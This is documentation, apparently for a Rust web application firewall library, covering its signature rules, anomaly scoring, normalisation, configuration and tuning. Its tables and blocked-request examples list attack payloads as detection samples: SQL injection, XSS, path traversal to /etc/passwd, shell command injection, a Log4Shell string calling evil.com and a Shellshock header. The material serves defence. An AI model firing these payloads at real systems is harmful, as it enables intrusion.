---
title: Web application firewall
summary: An anomaly-scoring WAF that stops SQL injection, XSS, path traversal, command injection, Log4Shell, SSRF and scanner probes in about 2 µs per request.
category: threats
order: 1
---

`Waf` is a signature-based web application firewall inspired by the OWASP Core Rule Set (CRS). It normalises every input to defeat common evasion tricks, matches it against a few hundred curated signatures in a single pass, and blocks the request when the accumulated anomaly score reaches a threshold. It ships in every preset (`Shield::recommended()`, `Shield::strict()`, `Shield::api()`), so most applications are protected without writing a single line of configuration.

## Threats mitigated

| Category | Typical payload | OWASP Top 10 (2021) |
|---|---|---|
| SQL injection | `' OR '1'='1`, `UNION SELECT`, `WAITFOR DELAY` | A03 Injection |
| Cross-site scripting | `<script>`, `onerror=`, `javascript:` | A03 Injection |
| Path traversal / LFI | `../../etc/passwd`, `php://filter` | A01 Broken Access Control |
| OS command injection | `;cat /etc/passwd`, `$(whoami)` | A03 Injection |
| Log4Shell, Spring4Shell, Shellshock | `${jndi:ldap://…}`, `() { :; };` | A06 Vulnerable and Outdated Components |
| SSRF / remote file inclusion | `169.254.169.254`, `gopher://` | A10 Server-Side Request Forgery |
| NoSQL injection | `user[$ne]=admin` | A03 Injection |
| Server-side template injection | `{{7*7}}`, `__class__` | A03 Injection |
| Scanner probes | `/.env`, `/.git/config`, `/wp-login.php` | A05 Security Misconfiguration |
| Protocol attacks | CRLF header injection, NUL bytes | A03 Injection |

> **Warning:** A WAF is defence in depth, not a fix. Keep using parameterised queries, contextual output encoding and strict input validation: signatures reduce the attack surface and buy you time when a vulnerability is disclosed, but a determined attacker can eventually craft a payload that no rule recognises.

## How it works

### Anomaly scoring

Every rule carries a score. Critical signatures such as `union select` or `<script` score 5 and block on their own; weaker indicators such as `<img` (3) or `alert(` (4) only block when combined with another match. The request is rejected when the total reaches the threshold (5 by default). Each rule counts once per request, even if it matches in several places.

A blocked request receives `403 Forbidden` with the code `waf_blocked`. The score, rule ids and categories are written to the audit trail (see [security events](/docs/events-stats)) but never sent to the client.

### What is inspected

The firewall only sees the request head: the URL path, the query string and the header values. A handful of headers that are noisy or carry credentials are skipped by default (`authorization`, `proxy-authorization`, `accept`, `accept-encoding`, `accept-language`, `content-length`, `content-type`, `if-none-match`, `if-modified-since`, `sec-ch-ua`, `sec-ch-ua-platform`, `sec-ch-ua-mobile`). Request bodies are inspected on demand from your handlers with `inspect_body` / `inspect_text` (see below).

### Paranoia levels

| Level | Adds | Recommended for |
|---|---|---|
| `Paranoia::Low` (1, default) | High-confidence signatures scored 3 to 5, plus the event-handler, shell-command and CRLF heuristics | Every application; used by the `recommended` and `api` presets |
| `Paranoia::Medium` (2) | Weaker indicators scored 1 to 3: `select * from`, `--`, `char(`, `<form`, `src=`, `127.0.0.1`, `{{`, `.php` or `.bak` in paths | Sensitive back offices; used by the `strict` preset |
| `Paranoia::High` (3) | Very aggressive single-character indicators: `'`, `#`, `<`, `>`, the word `or`, `localhost`, `.old` | Internal APIs with predictable traffic; expect tuning |

### Normalisation

Before matching, each input goes through the following steps, so that one signature covers many spellings of the same attack:

| Step | Evasion defeated | Example input | Normalised |
|---|---|---|---|
| Percent-decoding, twice when needed | Double URL encoding | `%253Cscript` | `<script` |
| `+` decoded as a space (query and bodies) | Form encoding | `1+OR+1%3D1` | `1 or 1=1` |
| HTML entity decoding (named, decimal, hex) | Entity smuggling | `&lt;script&gt;`, `&#x3c;svg` | `<script>`, `<svg` |
| SQL comment removal, including MySQL `/*!50000 … */` | Inline comments | `UNION/**/SELECT` | `union select` |
| Whitespace runs collapsed to one space | Tab and newline padding | `UNION%09%0A SELECT` | `union select` |
| Spaces around `;` `&` `(` `)` `=` `,` and the pipe removed | Operator spacing | `sleep (5)` | `sleep(5)` |
| Unicode-aware lower-casing | Mixed case | `UnIoN SeLeCt` | `union select` |

You can see the result yourself with `securite::waf::normalize(input, is_query)`.

### Rule ids and categories

| Ids | `Category` | Log name | Examples |
|---|---|---|---|
| 100–172 | `SqlInjection` | `sqli` | `union select`, `' or '1'='1`, `information_schema`, `waitfor delay` |
| 200–257 | `Xss` | `xss` | `<script`, `javascript:`, `document.cookie`, 245 = `on…=` event handler heuristic |
| 300–332 | `PathTraversal` | `traversal` | `../`, `/etc/passwd`, `php://`, `.htaccess` |
| 400–450 | `CommandInjection` | `cmdi` | `/bin/sh`, `${ifs}`, 450 = shell separator followed by a command (`;cat `, `&&wget `…) |
| 500–519 | `RemoteCodeExecution` | `rce` | `${jndi:`, `class.module.classloader`, `() { :;` |
| 600–623 | `Ssrf` | `ssrf` | `169.254.169.254`, `metadata.google.internal`, `gopher://` |
| 700–714 | `NoSqlInjection` | `nosqli` | `[$ne]`, `[$where]`, `"$regex"` |
| 800–822 | `TemplateInjection` | `ssti` | `{{7*7}}`, `{{config`, `__subclasses__` |
| 900–948 | `ScannerProbe` | `scanner` | `/.env`, `/.git/`, `/wp-login.php` (path only) |
| 1000–1001 | `Protocol` | `protocol` | NUL byte, 1001 = CRLF followed by a header name |
| your ids | `Custom` | `custom` | rules added with `custom_rule` |

`Category` and the `target` module live in `securite::waf` (they are not part of the prelude). `waf.rules()` returns the active rules with their pattern, score, paranoia level and targets.

## Quick start

```rust
use axum::{routing::get, Router};
use securite::prelude::*;

let app: Router = Router::new()
    .route("/search", get(|| async { "results" }))
    .layer(
        Shield::builder()
            .guard(RequestId::new())
            .guard(Waf::new())
            .build(),
    );
```

To customise the firewall of a preset, add your own `Waf`: a guard with the same name replaces the preset one.

```rust
use securite::prelude::*;

let shield = ShieldBuilder::recommended()
    .guard(Waf::new().paranoia(Paranoia::Medium))
    .build();
```

## Configuration

| Method | Default | Description |
|---|---|---|
| `Waf::new()` | paranoia `Low`, threshold 5, all built-in rules | Creates the firewall (`Waf::default()` is equivalent). |
| `.paranoia(Paranoia)` | `Paranoia::Low` | Sensitivity level; higher levels enable noisier rules. |
| `.threshold(u32)` | `5` | Anomaly score at which a request is blocked (minimum 1). |
| `.disable_rules(ids)` | none | Disables rules by id (any `IntoIterator<Item = u16>`). |
| `.disable_category(Category)` | none | Disables every built-in rule of a category, heuristics included. |
| `.custom_rule(id, pattern, score, targets)` | none | Adds a case-insensitive substring rule in `Category::Custom`, active at every paranoia level. |
| `.skip_paths(prefixes)` | none | Path prefixes that are not inspected at all. |
| `.inspect_headers(bool)` | `true` | Inspects header values. |
| `.skip_headers(names)` | see above | Header names never inspected, added to the default list. |
| `.monitor()` | enforce | Reports attacks without blocking them. |

Inspection API, usable anywhere in your code:

| Method | Returns | Description |
|---|---|---|
| `.inspect(&request::Parts)` | `Verdict` | Scores a request head exactly like the guard does. |
| `.inspect_body(&str)` | `Verdict` | Scores arbitrary text with the rules that target `BODY`. |
| `.inspect_text(&str)` | `Verdict` | Alias of `inspect_body`. |
| `.rules()` | `&[Rule]` | The active rules (built-in and custom). |

### Targets

A rule only applies to the inputs listed in its target bit mask. The constants of `securite::waf::target` combine with the bitwise OR operator:

```rust
use securite::prelude::*;
use securite::waf::target;

// target::PATH     URL path
// target::QUERY    query string
// target::HEADERS  header values
// target::BODY     text passed to inspect_body / inspect_text
// target::ARGS     everything but the path
// target::ALL      everything
let waf = Waf::new()
    // An internal codename that must never reach the application.
    .custom_rule(5000, "project-nightingale", 5, target::ALL)
    // A weak signal: only blocks when combined with another match.
    .custom_rule(5001, "debug=true", 2, target::QUERY | target::BODY);
```

## Examples of blocked payloads

With the default configuration (paranoia `Low`, threshold 5):

```text
GET /search?q=1' OR '1'='1                           sqli        rule 105
GET /search?q=1 UNION SELECT password FROM users     sqli        rule 100
GET /search?q=%2527%2520OR%25201%253D1               sqli        rule 103 (double-encoded)
GET /?q=<script>alert(1)</script>                    xss         rules 200, 201, 229
GET /?q=<img src=x onerror=alert(1)>                 xss         rules 212, 245, 229
GET /download?file=../../../../etc/passwd            traversal   rules 300, 302
GET /?ip=127.0.0.1|whoami                            cmdi        rule 450
GET /?x=${jndi:ldap://evil.com/a}                    rce, ssrf   rules 500, 501, 609
GET /?url=http://169.254.169.254/latest/meta-data/   ssrf        rule 600
GET /login?user[$ne]=admin                           nosqli      rule 700
GET /?name={{7*7}}                                   ssti        rule 800
GET /.env                                            scanner     rule 900
GET /?q=a%0d%0aSet-Cookie:%20x=1                     protocol    rule 1001
User-Agent: () { :; }; /bin/bash -c id               rce, cmdi   rules 516, 401
```

Ordinary traffic such as `/blog/2024/10/union-of-sets-in-rust`, `/search?q=what%27s+new+in+rust`, `/?q=C%2B%2B+vs+Rust` or `/?title=Tom+%26+Jerry` goes through.

## Inspecting bodies in handlers

Guards only see the request head, so JSON documents, form fields or GraphQL queries are inspected from your handlers. Share the same `Waf` (it is cheap to clone) between the shield and your state:

```rust
use axum::{extract::State, http::StatusCode, routing::post, Json, Router};
use securite::prelude::*;
use serde::Deserialize;

#[derive(Clone)]
struct AppState {
    waf: Waf,
}

#[derive(Deserialize)]
struct NewComment {
    author: String,
    text: String,
}

async fn create_comment(
    State(state): State<AppState>,
    Json(comment): Json<NewComment>,
) -> StatusCode {
    // Inspect the decoded values, not the raw JSON text.
    for field in [&comment.author, &comment.text] {
        let verdict = state.waf.inspect_text(field);
        if verdict.blocked {
            tracing::warn!(score = verdict.score, rules = ?verdict.rules, "comment rejected by the WAF");
            return StatusCode::UNPROCESSABLE_ENTITY;
        }
    }
    // ... store the comment
    StatusCode::CREATED
}

let waf = Waf::new();
let app: Router = Router::new()
    .route("/comments", post(create_comment))
    .with_state(AppState { waf: waf.clone() })
    .layer(Shield::builder().guard(waf).build());
```

A `Verdict` exposes everything the firewall decided:

```rust
use securite::prelude::*;
use securite::waf::{Category, Verdict};

let waf = Waf::new();
let verdict: Verdict = waf.inspect_text("1' UNION/**/SELECT password FROM users--");

assert!(verdict.blocked); // score reached the threshold
assert!(verdict.score >= 5); // total anomaly score
assert!(verdict.categories.contains(&Category::SqlInjection));
println!("score={} rules={:?}", verdict.score, verdict.rules); // score=8 rules=[143, 100]
```

> **Warning:** Inspect deserialised values rather than the raw JSON body. The normalisation pipeline decodes URL encoding and HTML entities, not JSON escapes, so `"\u003cscript\u003e"` in a raw document would slip through while the decoded string `<script>` is caught.

## Tuning false positives

Start from the audit trail: every block records `score=… rules=[…] categories=…`. Then apply the narrowest fix that removes the false positive:

```rust
use securite::prelude::*;
use securite::waf::Category;

let waf = Waf::new()
    .paranoia(Paranoia::Medium)
    // Rule 157 ("--") clashes with our search syntax: `rust --unsafe`.
    .disable_rules([157])
    // Strapi-style filters such as filters[price][$gt]=10, and no MongoDB behind them.
    .disable_category(Category::NoSqlInjection)
    // Internal SQL console for DBAs, already protected by Auth and an IP allow-list.
    .skip_paths(["/admin/sql-console"])
    // Users search for code snippets, which then show up in the Referer header.
    .skip_headers(["referer"]);
```

- `disable_rules` is the scalpel: one rule, everywhere.
- `disable_category` removes a whole family, for threats that do not apply to your stack.
- `skip_paths` disables the firewall for path prefixes (matched on segment boundaries: `/admin` covers `/admin/users`, not `/administrator`). Keep these prefixes narrow and protect them otherwise.
- `skip_headers` ignores specific headers; `inspect_headers(false)` ignores all of them, which also gives up detection of Log4Shell and Shellshock payloads hidden in `User-Agent` or `Referer`.
- `threshold` raises the bar for every rule at once; prefer the options above.

## Rolling out with monitor mode

On an existing application, start in [monitor mode](/docs/monitor-mode): nothing is blocked, but every request that would have been blocked is logged at INFO level under the `securite` target, reported to your `on_event` hook with `enforced == false`, and counted in `StatsSnapshot::monitored`.

```rust
use securite::prelude::*;

let shield = ShieldBuilder::recommended()
    // Same name as the preset WAF, so this one replaces it.
    .guard(Waf::new().paranoia(Paranoia::Medium).monitor())
    .on_event(|e| {
        if e.guard == "waf" && !e.enforced {
            // details look like: score=8 rules=[143, 100] categories=sqli
            tracing::info!(path = e.path, details = e.details, "the WAF would have blocked this request");
        }
    })
    .build();
```

1. Deploy in monitor mode and collect a representative period of traffic (a full business week is a good start).
2. Group the findings by rule id and review them: real attacks, or legitimate traffic?
3. Tune with `disable_rules`, `skip_paths` or `skip_headers`.
4. Remove `.monitor()` and keep watching the blocked counter.

> **Tip:** To evaluate a stricter paranoia level while the current one keeps enforcing, add a second firewall in monitor mode as a standalone layer below your shield: `router.layer(Waf::new().paranoia(Paranoia::High).monitor()).layer(shield)`. Its findings are logged under the `securite` tracing target.

## Standalone layer

Like every guard, `Waf` is a tower layer on its own:

```rust
use axum::{routing::get, Router};
use securite::prelude::*;

let app: Router = Router::new()
    .route("/", get(|| async { "home" }))
    .layer(Waf::new().paranoia(Paranoia::Medium));
```

A standalone layer builds an internal shield with default settings: problem+json errors, client IP from the TCP peer, logging enabled, and no access to your `on_event` hook or statistics. Register the WAF in your `Shield` when you need those.

## Performance

All active signatures are compiled into a single Aho-Corasick automaton (DFA) when the firewall is configured. Each input is normalised once and scanned in one linear pass, so the cost does not grow with the number of rules. In the crate benchmarks (`cargo bench -p securite`), inspecting a typical browser request, with a query string and half a dozen headers, takes about 2 µs, whether the request is clean or malicious. Figures vary with your hardware.

Body inspection is linear in the size of the text: cap request sizes with `BodyLimit` before inspecting large documents.

## Pitfalls and tips

- Configure the firewall once at startup. Every builder call recompiles the automaton; afterwards, cloning a `Waf` is cheap because the compiled engine is shared.
- A `Shield` holds one guard per name: a second `Waf` replaces the first one.
- Custom patterns are compared with normalised text. Write them in lower case, with single spaces and without spaces around `;`, `&`, `(`, `)`, `=` and `,`, otherwise they never match.
- Pick custom rule ids of 5000 and above. Reusing a built-in id makes `disable_rules` affect both rules, and the score is counted only once.
- `inspect_text` returns the raw verdict: it ignores monitor mode and `skip_paths`, does not emit security events and does not update the statistics. Decide in your handler what to do and log it.
- The WAF runs after the rate limiter and the bot blocker, so floods and known scanners are dropped by cheaper checks first, and before CSRF and authentication.
- Combine it with [auto-ban](/docs/auto-ban): every WAF block counts as a strike, so persistent attackers end up banned.

## Related pages

- [Bot blocker](/docs/bot-blocker)
- [Monitor mode](/docs/monitor-mode)
- [Security events and statistics](/docs/events-stats)
- [Error responses](/docs/error-format)
- [Auto-ban](/docs/auto-ban)
- [HTTP hygiene](/docs/hygiene)
